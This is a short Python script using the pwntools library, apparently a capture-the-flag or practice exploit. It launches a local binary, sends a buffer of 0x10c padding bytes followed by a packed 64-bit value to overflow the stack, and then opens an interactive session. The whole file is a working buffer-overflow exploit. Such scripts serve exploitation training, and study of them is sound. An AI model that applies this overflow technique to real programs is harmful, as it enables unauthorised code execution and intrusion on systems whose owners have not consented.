# coding: utf-8
from pwn import *
p = process("./a.out")
addr = (0x110 - 0x4)
p_64 = p64(0x69420)
p_ = b'a'*(addr) + p_64
p.sendline(p_)
p.interactive()
